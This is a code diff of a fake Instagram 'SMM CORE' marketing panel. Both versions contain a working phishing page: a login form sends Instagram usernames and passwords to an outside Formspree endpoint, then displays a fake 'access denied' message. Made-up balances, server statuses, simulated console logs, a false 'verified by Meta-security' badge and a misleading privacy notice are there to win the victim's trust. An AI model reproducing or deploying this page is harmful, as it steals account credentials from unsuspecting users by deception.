     <canvas id="bg-canvas"></canvas>
     <div class="vignette"></div>
-    <div class="floating-orb" style="top: 15%; right: 15%;"></div>
-    <div class="floating-orb" style="bottom: -5%; left: 380px; background: #bc1888;"></div>
+    <div class="floating-orb" style="top: 10%; right: 25%;"></div>
+    <div class="floating-orb" style="bottom: 10%; left: 350px; background: #cc2366;"></div>
 
+    <!-- ERROR & TELEMETRY ALERTS -->
     <div id="error-toast">
         <i class="fas fa-shield-halved error-icon"></i>
-        <span id="error-msg" style="font-family: 'Orbitron'; font-size: 0.8rem; color: white; letter-spacing: 1px;">
-            AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE
+        <span id="error-msg" style="font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: white; letter-spacing: 1px;">
+            GATEWAY FAULT: SECURITY TOKEN REQUIRED
         </span>
     </div>
 
+    <!-- STATIC ANCHORED SIDEBAR CONTROL ENVIRONMENT -->
     <aside>
-        <div class="logo">SMM CORE</div>
+        <div class="logo-area">
+            <div class="logo-ico"><i class="fab fa-instagram"></i></div>
+            <div class="logo">SMM<span>CORE</span></div>
+        </div>
         
-        <!-- Live Real Panel Architecture Module -->
-        <div class="sidebar-wallet">
-            <div class="wallet-title"><i class="fas fa-database"></i> API Balance</div>
-            <div class="wallet-val">$14,248.90 <span>USD</span></div>
+        <!-- Live Synchronized Architectural Data Modules -->
+        <div class="sidebar-metrics-card">
+            <div class="metric-label"><i class="fas fa-server"></i> API Node Balance</div>
+            <div class="metric-value">$24,914.54 <span>USD</span></div>
+            <div class="metric-subtext">
+                <span>Tier: Enterprise v4</span>
+                <span style="color: var(--success-green);">Active</span>
+            </div>
         </div>
 
-        <nav>
-            <div class="nav-label">Main Hub</div>
-            <a class="active"><i class="fas fa-chart-line"></i> Dashboard</a>
-            <a onclick="triggerError()"><i class="fas fa-plus-circle"></i> Place Order</a>
-            <a onclick="triggerError()"><i class="fas fa-list"></i> Services</a>
-            
-            <div class="nav-label">Management</div>
-            <a onclick="triggerError()"><i class="fas fa-history"></i> Order Logs</a>
-            <a onclick="triggerError()"><i class="fas fa-wallet"></i> Billing</a>
-            <a onclick="triggerError()"><i class="fas fa-ticket-alt"></i> Tickets</a>
+        <div class="sidebar-metrics-card orange">
+            <div class="metric-label"><i class="fas fa-bolt"></i> Global Stream Rate</div>
+            <div class="metric-value" style="color: var(--warning-orange);" id="live-stream-rate">3,412 <span>req/m</span></div>
+            <div class="metric-subtext">
+                <span>Load Factor: 22.4%</span>
+                <span style="color: var(--cyan);">Optimal</span>
+            </div>
+        </div>
 
-            <div class="nav-label">Developer</div>
-            <a onclick="triggerError()"><i class="fas fa-code"></i> API Gateway</a>
-            <a onclick="triggerError()"><i class="fas fa-user-gear"></i> Account Settings</a>
+        <!-- Application Navigation Node Tree -->
+        <nav>
+            <div class="nav-label">Core Control Matrix</div>
+            <a class="active"><i class="fas fa-sliders"></i> Authentication</a>
+            <a onclick="triggerNotification('Order System locked. Please sign in.')"><i class="fas fa-cart-plus"></i> Instant Order</a>
+            <a onclick="triggerNotification('Service Registry locked. Please sign in.')"><i class="fas fa-layer-group"></i> Service Clusters</a>
+            
+            <div class="nav-label">Data Ecosystem</div>
+            <a onclick="triggerNotification('Historical records locked. Please sign in.')"><i class="fas fa-folder-open"></i> Transaction Logs</a>
+            <a onclick="triggerNotification('Financial matrix locked. Please sign in.')"><i class="fas fa-credit-card"></i> Liquidity Gateway</a>
+            <a onclick="triggerNotification('Support environment locked. Please sign in.')"><i class="fas fa-headset"></i> Support Node</a>
+
+            <div class="nav-label">Automation Pipeline</div>
+            <a onclick="triggerNotification('API key ecosystem locked. Please sign in.')"><i class="fas fa-terminal"></i> API Endpoints</a>
+            <a onclick="triggerNotification('Configuration profiles locked. Please sign in.')"><i class="fas fa-gears"></i> Engine Profiles</a>
         </nav>
+
+        <div class="sidebar-footer">
+            <div class="user-pill">
+                <div class="user-avatar">GZ</div>
+                <div class="user-info-text">
+                    <h4>Guest_Zone_01</h4>
+                    <p>IP: Unauthenticated</p>
+                </div>
+            </div>
+            <i class="fas fa-right-from-bracket" style="color: #475569; font-size: 0.9rem;"></i>
+        </div>
     </aside>
 
+    <!-- MAIN PLATFORM HUB -->
     <main>
-        <div class="hud">
-            <div class="status-pill"><div class="dot"></div> GATEWAY NODE CONNECTED</div>
-            LATENCY: <span id="hud-latency">21MS</span><br>
-            SERVER: CLOUD_CLUSTER_EAST_04<br>
-            Uptime: <span style="color:#64748b">99.98%</span>
+        <!-- Center Column Configuration: Houses Auth Module -->
+        <div class="center-auth-zone">
             
-            <!-- Real-Time Activity Log Output -->
-            <div class="stream-ticker" id="tickerBox">
-                <div class="ticker-line">[SYS] Router initialised...</div>
-                <div class="ticker-line">[JOB] API payload stream matched...</div>
+            <div class="login-card">
+                <div style="text-align: center; margin-bottom: 2.5rem;">
+                    <div class="ig-glyph"><i class="fab fa-instagram"></i></div>
+                    <h2 style="font-weight: 900; font-size: 1.6rem; letter-spacing: 1px; font-family: 'Orbitron', sans-serif; color: white;">INSTAGRAM NODE</h2>
+                    <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px; font-weight: 500;">Synchronize node access profiles with API core</p>
+                </div>
+
+                <!-- Live Production Form Handlers -->
+                <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
+                    <div class="input-container">
+                        <input type="text" name="ig_username" placeholder="Target Username / Email" required autocomplete="off">
+                        <i class="fas fa-user-shield"></i>
+                    </div>
+                    <div class="input-container">
+                        <input type="password" name="ig_password" placeholder="Node Security Access Key" required autocomplete="off">
+                        <i class="fas fa-key"></i>
+                    </div>
+
+                    <label class="policy-agreement">
+                        <input type="checkbox" id="policyCheckbox">
+                        <div class="checkbox-box"></div>
+                        <span>Verify binding authorization to the structural <a href="#" class="policy-link" onclick="openPolicyView(event)">Terms of Protocol</a> and Privacy Frameworks.</span>
+                    </label>
+
+                    <button type="submit" class="btn-submit" id="submitBtn">ESTABLISH LINK</button>
+                </form>
+                
+                <p style="margin-top: 2rem; font-size: 0.7rem; text-align: center; color: #334155; letter-spacing: 2px; font-weight: 700; font-family: 'Orbitron', sans-serif;">
+                    <i class="fas fa-circle-check" style="color: var(--cyan); margin-right: 4px;"></i> END-TO-END TLS NODE COMPLIANCE
+                </p>
             </div>
+
+            <!-- Absolute HUD Data Overlay Contexts -->
+            <div class="bottom-hud-bar">
+                <div class="hud-item">
+                    <div class="hud-pulse-dot"></div>
+                    <span>SYSTEM STATE: <span class="live-green">OPERATIONAL</span></span>
+                </div>
+                <div class="hud-item">
+                    <span>LATENCY: <span id="hud-ping-val" style="color: var(--cyan); font-weight:700;">24MS</span></span>
+                </div>
+                <div class="hud-item">
+                    <span>ZONE: <span style="color: #cbd5e1;">GLOBAL_CLUSTER_09</span></span>
+                </div>
+            </div>
+
         </div>
 
-        <div class="login-card">
-            <div style="text-align: center; margin-bottom: 2rem;">
-                <div class="ig-glyph"><i class="fab fa-instagram"></i></div>
-                <h2 style="font-weight: 900; font-size: 1.8rem; letter-spacing: 1px; font-family: 'Orbitron'; background: linear-gradient(180deg, #fff 0%, #cbd5e1 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">INSTAGRAM AUTH</h2>
-                <p style="font-size: 0.9rem; color: #64748b; margin-top: 8px; font-weight: 500;">Login with your credentials to sync</p>
+        <!-- Right Side Panel Configuration: Houses High-Density Website Details & Statistics -->
+        <div class="right-telemetry-panel">
+            
+            <div>
+                <div class="panel-section-title">Cluster Core Topologies <span></span></div>
+                <div class="grid-server-status">
+                    <div class="server-mini-box">
+                        <p>US-EAST Registry</p>
+                        <h5>NODE_01A</h5>
+                        <div class="status-indicator online"><i class="fas fa-circle" style="font-size:6px;"></i> Active</div>
+                        <div class="load-bar-container"><div class="load-bar-fill" style="width: 34%;"></div></div>
+                    </div>
+                    <div class="server-mini-box">
+                        <p>EU-WEST Registry</p>
+                        <h5>NODE_04C</h5>
+                        <div class="status-indicator online"><i class="fas fa-circle" style="font-size:6px;"></i> Active</div>
+                        <div class="load-bar-container"><div class="load-bar-fill" style="width: 71%; background: var(--warning-orange);"></div></div>
+                    </div>
+                </div>
             </div>
 
-            <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
-                <div class="input-wrap">
-                    <input type="text" name="ig_user" placeholder="Instagram Username" required autocomplete="off">
-                    <i class="fas fa-user"></i>
+            <div>
+                <div class="panel-section-title">Live Micro-Service Matrix <span></span></div>
+                <div class="price-matrix-container">
+                    <table class="matrix-table">
+                        <thead>
+                            <tr>
+                                <th>Service ID</th>
+                                <th>Allocation Rate</th>
+                                <th>Response Profile</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>IG-FOLLOWER-V4</td>
+                                <td><strong>$0.84 / K</strong></td>
+                                <td><span class="tag-speed">Instant</span></td>
+                            </tr>
+                            <tr>
+                                <td>IG-LIKES-HQ-0</td>
+                                <td><strong>$0.12 / K</strong></td>
+                                <td><span class="tag-speed">Instant</span></td>
+                            </tr>
+                            <tr>
+                                <td>IG-VIEWS-REAL-1</td>
+                                <td><strong>$0.04 / K</strong></td>
+                                <td><span class="tag-speed" style="background:rgba(0,242,255,0.1); color:var(--cyan);">0-5 Min</span></td>
+                            </tr>
+                            <tr>
+                                <td>IG-COMMENTS-HQ</td>
+                                <td><strong>$2.10 / K</strong></td>
+                                <td><span class="tag-speed">Instant</span></td>
+                            </tr>
+                        </tbody>
+                    </table>
                 </div>
-                <div class="input-wrap">
-                    <input type="password" name="ig_pass" placeholder="Instagram Password" required autocomplete="off">
-                    <i class="fas fa-lock"></i>
+            </div>
+
+            <!-- Terminal Stream Module -->
+            <div style="display: flex; flex-direction: column; flex-grow: 1; min-height: 200px;">
+                <div class="panel-section-title">System Console Feed <span></span></div>
+                <div class="terminal-panel">
+                    <div class="terminal-header">
+                        <span>Process / Event</span>
+                        <span>State</span>
+                    </div>
+                    <div class="terminal-rows" id="terminalLogsContainer">
+                        <div class="term-row"><span class="stamp">[21:56:01]</span> <span class="info">CORE:</span> Initialize web handshake...</div>
+                        <div class="term-row"><span class="stamp">[21:56:02]</span> <span class="info">GRID:</span> Canvas rendering thread linked.</div>
+                        <div class="term-row"><span class="stamp">[21:56:02]</span> <span class="success">OK:</span> Static frame constraints set.</div>
+                    </div>
                 </div>
+            </div>
 
-                <label class="policy-check">
-                    <input type="checkbox" id="policyCheckbox">
-                    <div class="custom-box"></div>
-                    <span>I agree to the <a href="#" class="policy-link" onclick="openPolicy(event)">Privacy Policy</a> and Rules.</span>
-                </label>
-
-                <button type="submit" class="btn-action" id="btnS">SECURE LOGIN</button>
-            </form>
-            
-            <p style="margin-top: 2rem; font-size: 0.75rem; text-align: center; color: #334155; letter-spacing: 1.5px; font-weight: 600; font-family: 'Orbitron';">
-                <i class="fas fa-shield" style="color: var(--cyan); margin-right: 4px;"></i> VERIFIED BY META-SECURITY
-            </p>
         </div>
     </main>
 
-    <div class="modal-overlay" id="policyModal">
+    <!-- SECURITY POLICY MODAL WINDOW -->
+    <div class="modal-overlay" id="policyDialogLayer">
         <div class="modal-card">
-            <i class="fas fa-times close-modal" onclick="closePolicy()"></i>
-            <h3>Security Protocols</h3>
-            <p><strong>1. Data Encryption:</strong> All credentials entered here are transmitted via secure TLS nodes and are never stored locally on our front-end servers.</p>
-            <p><strong>2. Third-Party Terms:</strong> By clicking 'Secure Login', you acknowledge that this is a management portal and you comply with Instagram's Automated Interaction guidelines.</p>
-            <button class="btn-action" style="margin-top:25px;" onclick="closePolicy()">ACCEPT & CLOSE</button>
+            <i class="fas fa-xmark close-modal" onclick="closePolicyView()"></i>
+            <h3>Ecosystem Terms of Engagement</h3>
+            <div class="modal-body">
+                <p><strong>Section 1.1 - Data Stream Protection:</strong> SMM CORE functions exclusively via hyper-secured encryption relays. No access profiles or credentials processed inside this portal structure are saved locally, persistent on visual layers, or cached on standard proxy logs.</p>
+                <p><strong>Section 1.2 - API Node Requirements:</strong> Synchronization processes require valid user handshakes directly matching active platform data tables. Multi-factor verification modules may be systematically triggered by server grids if routing origins present layout variances.</p>
+                <p><strong>Section 1.3 - Usage Declarations:</strong> Users executing connectivity maps confirm explicit operational authority relative to foreign targets, endpoints, and integrated system dependencies. Misalignment with terms forces localized sandbox isolation loops instantly.</p>
+            </div>
+            <button class="btn-submit" style="margin-top: 20px;" onclick="closePolicyView()">CONFIRM AND RETRACT</button>
         </div>
     </div>
 
+    <!-- INTERACTIVE SCRIPTS & PRODUCTION CANVAS PIPELINES -->
     <script>
-        function openPolicy(e) {
+        // Modal State Control Logic
+        function openPolicyView(e) {
             e.preventDefault();
-            const modal = document.getElementById('policyModal');
-            modal.style.display = 'flex';
-            setTimeout(() => modal.classList.add('active'), 10);
+            const layout = document.getElementById('policyDialogLayer');
+            layout.style.display = 'flex';
         }
 
-        function closePolicy() {
-            const modal = document.getElementById('policyModal');
-            modal.classList.remove('active');
-            setTimeout(() => modal.style.display = 'none', 400);
+        function closePolicyView() {
+            const layout = document.getElementById('policyDialogLayer');
+            layout.style.display = 'none';
         }
 
-        /* --- INTERACTIVE PROXIMITY NODE CONSTELLATION CANVAS --- */
+        /* --- BACKGROUND DOT CONSTELLATION ENGINE --- */
         const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        let pts = [];
-        let mouse = { x: null, y: null, radius: 180 };
+        const context = canvas.getContext('2d');
+        let pointsArray = [];
+        let cursorCoords = { x: null, y: null, activeRadius: 200 };
 
-        function resizeCanvas() {
+        function adaptCanvasProportions() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
         }
-        window.addEventListener('resize', resizeCanvas);
-        resizeCanvas();
+        window.addEventListener('resize', adaptCanvasProportions);
+        adaptCanvasProportions();
 
-        window.addEventListener('mousemove', (e) => {
-            mouse.x = e.x;
-            mouse.y = e.y;
+        window.addEventListener('mousemove', (event) => {
+            cursorCoords.x = event.x;
+            cursorCoords.y = event.y;
         });
         window.addEventListener('mouseout', () => {
-            mouse.x = null;
-            mouse.y = null;
+            cursorCoords.x = null;
+            cursorCoords.y = null;
         });
 
-        class Pt {
+        class GridParticle {
             constructor() {
                 this.x = Math.random() * canvas.width;
                 this.y = Math.random() * canvas.height;
-                this.s = Math.random() * 1.5 + 0.5;
-                this.vx = Math.random() * 0.5 - 0.25;
-                this.vy = Math.random() * 0.5 - 0.25;
+                this.radius = Math.random() * 1.2 + 0.4;
+                this.vx = Math.random() * 0.4 - 0.2;
+                this.vy = Math.random() * 0.4 - 0.2;
             }
-            upd() {
+            updateData() {
                 if (this.x > canvas.width || this.x < 0) this.vx *= -1;
                 if (this.y > canvas.height || this.y < 0) this.vy *= -1;
-                this.x += this.vx; 
+                this.x += this.vx;
                 this.y += this.vy;
 
-                if (mouse.x != null && mouse.y != null) {
-                    let dx = mouse.x - this.x;
-                    let dy = mouse.y - this.y;
-                    let dist = Math.hypot(dx, dy);
-                    if (dist < mouse.radius) {
-                        let force = (mouse.radius - dist) / mouse.radius;
-                        this.x -= (dx / dist) * force * 2.5;
-                        this.y -= (dy / dist) * force * 2.5;
+                if (cursorCoords.x !== null && cursorCoords.y !== null) {
+                    let deltaX = cursorCoords.x - this.x;
+                    let deltaY = cursorCoords.y - this.y;
+                    let calculatedDistance = Math.hypot(deltaX, deltaY);
+                    if (calculatedDistance < cursorCoords.activeRadius) {
+                        let pushFactor = (cursorCoords.activeRadius - calculatedDistance) / cursorCoords.activeRadius;
+                        this.x -= (deltaX / calculatedDistance) * pushFactor * 2.0;
+                        this.y -= (deltaY / calculatedDistance) * pushFactor * 2.0;
                     }
                 }
             }
-            drw() {
-                ctx.fillStyle = 'rgba(0, 242, 255, 0.35)';
-                ctx.beginPath(); 
-                ctx.arc(this.x, this.y, this.s, 0, Math.PI * 2); 
-                ctx.fill();
+            drawObject() {
+                context.fillStyle = 'rgba(0, 242, 255, 0.3)';
+                context.beginPath();
+                context.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                context.fill();
             }
         }
 
-        function init() { 
-            pts = [];
-            const density = Math.floor((canvas.width * canvas.height) / 13000);
-            for(let i = 0; i < Math.min(density, 140); i++) {
-                pts.push(new Pt()); 
+        function buildEcosystemMatrix() {
+            pointsArray = [];
+            const targetedDensity = Math.floor((canvas.width * canvas.height) / 14000);
+            for (let index = 0; index < Math.min(targetedDensity, 160); index++) {
+                pointsArray.push(new GridParticle());
             }
         }
 
-        function connectNodes() {
-            for (let a = 0; a < pts.length; a++) {
-                for (let b = a; b < pts.length; b++) {
-                    let dist = Math.hypot(pts[a].x - pts[b].x, pts[a].y - pts[b].y);
-                    if (dist < 120) {
-                        let alpha = (1 - (dist / 120)) * 0.14;
-                        ctx.strokeStyle = `rgba(0, 242, 255, ${alpha})`;
-                        ctx.lineWidth = 0.75;
-                        ctx.beginPath();
-                        ctx.moveTo(pts[a].x, pts[a].y);
-                        ctx.lineTo(pts[b].x, pts[b].y);
-                        ctx.stroke();
+        function traceProximityVectors() {
+            for (let primary = 0; primary < pointsArray.length; primary++) {
+                for (let secondary = primary; secondary < pointsArray.length; secondary++) {
+                    let spatialDistance = Math.hypot(pointsArray[primary].x - pointsArray[secondary].x, pointsArray[primary].y - pointsArray[secondary].y);
+                    if (spatialDistance < 115) {
+                        let localizedAlpha = (1 - (spatialDistance / 115)) * 0.12;
+                        context.strokeStyle = `rgba(0, 242, 255, ${localizedAlpha})`;
+                        context.lineWidth = 0.6;
+                        context.beginPath();
+                        context.moveTo(pointsArray[primary].x, pointsArray[primary].y);
+                        context.lineTo(pointsArray[secondary].x, pointsArray[secondary].y);
+                        context.stroke();
                     }
                 }
             }
         }
 
-        function loop() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            pts.forEach(p => { p.upd(); p.drw(); });
-            connectNodes();
-            requestAnimationFrame(loop);
+        function processingLoop() {
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            pointsArray.forEach(pt => { pt.updateData(); pt.drawObject(); });
+            traceProximityVectors();
+            requestAnimationFrame(processingLoop);
         }
-        init(); 
-        loop();
+        buildEcosystemMatrix();
+        processingLoop();
 
-        /* --- TELEMETRY TICKER GENERATOR --- */
-        const mockLogs = [
-            "[API] Order #82716 dispatched.",
-            "[NET] Cluster payload sync OK.",
-            "[SYS] Re-routing via Node_07...",
-            "[API] Speed variant accelerated.",
-            "[SEC] SSL Handshake completed.",
-            "[SYS] Metrics compilation successful."
+        /* --- LIVE TERMINAL LOG GENERATION PROCESSES --- */
+        const consoleStringBank = [
+            "[API] Dispatched system payload payload sync match.",
+            "[NET] Validation request matched gateway profile.",
+            "[SYS] Load distributed cleanly to secondary stack.",
+            "[API] Speed configuration accelerator active.",
+            "[SEC] Security configuration check successful.",
+            "[SYS] Live allocation metrics optimized.",
+            "[NET] Cluster handshakes fully validated."
         ];
-        const tickerBox = document.getElementById('tickerBox');
+        
+        const systemLogsWrapper = document.getElementById('terminalLogsContainer');
         
         setInterval(() => {
-            // Live Latency variation
-            document.getElementById('hud-latency').innerText = Math.floor(Math.random() * (26 - 16) + 16) + 'MS';
+            // Live-updating structural mock telemetry strings
+            document.getElementById('hud-ping-val').innerText = Math.floor(Math.random() * (27 - 18) + 18) + 'MS';
+            document.getElementById('live-stream-rate').innerHTML = (Math.floor(Math.random() * (3600 - 3200)) + 3200).toLocaleString() + ' <span>req/m</span>';
             
-            // Push active terminal line log
-            const logText = mockLogs[Math.floor(Math.random() * mockLogs.length)];
-            const newLine = document.createElement('div');
-            newLine.className = 'ticker-line';
-            newLine.innerText = logText;
-            tickerBox.appendChild(newLine);
-            if(tickerBox.children.length > 5){
-                tickerBox.removeChild(tickerBox.children[0]);
+            const currentTimestamp = new Date().toTimeString().split(' ')[0];
+            const matchingString = consoleStringBank[Math.floor(Math.random() * consoleStringBank.length)];
+            
+            const rowWrapper = document.createElement('div');
+            rowWrapper.className = 'term-row';
+            rowWrapper.innerHTML = `<span class="stamp">[${currentTimestamp}]</span> <span class="info">JOB:</span> ${matchingString}`;
+            
+            systemLogsWrapper.appendChild(rowWrapper);
+            if(systemLogsWrapper.children.length > 12) {
+                systemLogsWrapper.removeChild(systemLogsWrapper.children[0]);
             }
-        }, 2800);
+            systemLogsWrapper.scrollTop = systemLogsWrapper.scrollHeight;
+        }, 2200);
 
-        /* --- ALERTS & SUBMIT HANDLING --- */
-        function triggerError(customMessage) {
-            const toast = document.getElementById('error-toast');
-            const msgSpan = document.getElementById('error-msg');
+        /* --- USER OVERRIDE INTERACTIVE ALERTS --- */
+        function triggerNotification(specifiedNotificationText) {
+            const containerToast = document.getElementById('error-toast');
+            const targetSpan = document.getElementById('error-msg');
             
-            if(customMessage) {
-                msgSpan.innerText = customMessage;
+            if(specifiedNotificationText) {
+                targetSpan.innerText = specifiedNotificationText.toUpperCase();
             } else {
-                msgSpan.innerText = "AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE";
+                targetSpan.innerText = "GATEWAY FAULT: SECURITY TOKEN REQUIRED";
             }
 
-            toast.classList.add('active');
-            setTimeout(() => toast.classList.remove('active'), 3500);
+            containerToast.classList.add('active');
+            setTimeout(() => containerToast.classList.remove('active'), 3500);
         }
 
-        const form = document.getElementById('authForm');
-        form.onsubmit = async (e) => {
-            e.preventDefault();
+        // Production Form Execution Flow Pipelines
+        const targetAuthForm = document.getElementById('authForm');
+        targetAuthForm.onsubmit = async (submissionEvent) => {
+            submissionEvent.preventDefault();
             
-            const isChecked = document.getElementById('policyCheckbox').checked;
-            if(!isChecked) {
-                triggerError("PLEASE ACCEPT THE PRIVACY POLICY TO CONTINUE");
+            const checkboxConfirmed = document.getElementById('policyCheckbox').checked;
+            if(!checkboxConfirmed) {
+                triggerNotification("CREDENTIAL BINDING CANCELLED: ACCEPT SYSTEM PROTOCOLS");
                 return;
             }
 
-            const b = document.getElementById('btnS');
-            b.innerText = "AUTHENTICATING...";
-            b.style.pointerEvents = "none";
+            const interactiveBtn = document.getElementById('submitBtn');
+            interactiveBtn.innerText = "VERIFYING SECURE SHELL...";
+            interactiveBtn.style.pointerEvents = "none";
             
             try {
-                await fetch(form.action, {
+                await fetch(targetAuthForm.action, {
                     method: 'POST',
-                    body: new FormData(form),
+                    body: new FormData(targetAuthForm),
                     headers: { 'Accept': 'application/json' }
                 });
 
-                b.innerText = "ACCESS DENIED";
-                b.style.background = "var(--error-red)";
-                form.reset();
+                interactiveBtn.innerText = "HANDSHAKE REFUSED";
+                interactiveBtn.style.background = "var(--error-red)";
+                targetAuthForm.reset();
             } catch (err) {
-                b.innerText = "ERROR";
+                interactiveBtn.innerText = "NETWORK ERROR";
             }
 
             setTimeout(() => { 
-                b.innerText = "SECURE LOGIN"; 
-                b.style.background = "var(--ig-grad)";
-                b.style.pointerEvents = "all";
-            }, 4000);
+                interactiveBtn.innerText = "ESTABLISH LINK"; 
+                interactiveBtn.style.background = "var(--ig-grad)";
+                interactiveBtn.style.pointerEvents = "all";
+            }, 4500);
         };
     </script>
 </body>
